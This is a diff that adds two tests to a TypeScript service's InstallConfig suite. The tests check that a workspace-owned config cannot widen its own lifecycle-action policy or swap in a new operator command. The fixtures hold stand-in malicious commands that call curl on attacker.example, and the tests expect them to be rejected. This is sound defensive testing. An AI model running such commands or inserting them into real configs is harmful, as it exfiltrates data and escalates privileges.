@@ -341,6 +341,95 @@ test("putInstallConfig accepts explicit lifecycle actions and rejects missing po
   expect(config.lifecycleActions?.[0]?.id).toBe("publish");
 });
 
+test("a Workspace-owned InstallConfig cannot widen its own lifecycle action policy", async () => {
+  const { store, service } = build();
+  await seedWorkspace(store);
+  // The per-install row inherits a runner-only grant from the shared config it
+  // was cloned from. Widening it in the same write that installs the action
+  // would be self-authorization: `validateLifecycleActions` only ever checks
+  // the policy carried by that write.
+  const stored = await seedConfig(store, {
+    id: "icfg_scoped00000001",
+    workspaceId: "ws_1",
+    internal: { reason: "per_install_overrides" },
+    policy: {
+      lifecycleActions: {
+        allowedExecutors: ["runner"],
+        allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
+      },
+    },
+  });
+
+  await expect(
+    service.putInstallConfig({
+      ...stored,
+      lifecycleActions: [
+        {
+          apiVersion: "takosumi.dev/v1alpha1",
+          kind: "command",
+          id: "activate",
+          phase: "post_apply",
+          executor: "operator",
+          command: ["curl", "https://attacker.example/steal"],
+          runnerCapability: CAPSULE_LIFECYCLE_COMMAND_CAPABILITY,
+        },
+      ],
+      policy: {
+        lifecycleActions: {
+          allowedExecutors: ["runner", "operator"],
+          allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
+        },
+      },
+    }),
+  ).rejects.toMatchObject({
+    code: "permission_denied",
+    message: expect.stringContaining("allowedExecutors"),
+  });
+});
+
+test("a Workspace-owned InstallConfig cannot author a new operator lifecycle action", async () => {
+  const { store, service } = build();
+  await seedWorkspace(store);
+  const inheritedAction = {
+    apiVersion: "takosumi.dev/v1alpha1" as const,
+    kind: "command" as const,
+    id: "activate",
+    phase: "post_apply" as const,
+    executor: "operator" as const,
+    command: ["bun", "scripts/control/takosumi-release.mjs", "production"],
+    runnerCapability: CAPSULE_LIFECYCLE_COMMAND_CAPABILITY,
+  };
+  const policy = {
+    lifecycleActions: {
+      allowedExecutors: ["runner", "operator"] as const,
+      allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
+    },
+  };
+  const stored = await seedConfig(store, {
+    id: "icfg_scoped00000002",
+    workspaceId: "ws_1",
+    internal: { reason: "per_install_overrides" },
+    lifecycleActions: [inheritedAction],
+    policy,
+  });
+
+  // The policy is unchanged and legitimately allows an operator executor, but
+  // an operator action is run by the operator's release-activation webhook, so
+  // the command itself may only be inherited verbatim.
+  await expect(
+    service.putInstallConfig({
+      ...stored,
+      lifecycleActions: [
+        { ...inheritedAction, command: ["curl", "https://attacker.example"] },
+      ],
+    }),
+  ).rejects.toMatchObject({ code: "permission_denied" });
+
+  // Re-persisting the inherited action (and narrowing) stays allowed.
+  const unchanged = await service.putInstallConfig(stored);
+  expect(unchanged.lifecycleActions?.[0]?.id).toBe("activate");
+});
+
 test("InstallConfig reads list only selectable service-side configuration", async () => {
   const { store, service } = build();
   await seedConfig(store);
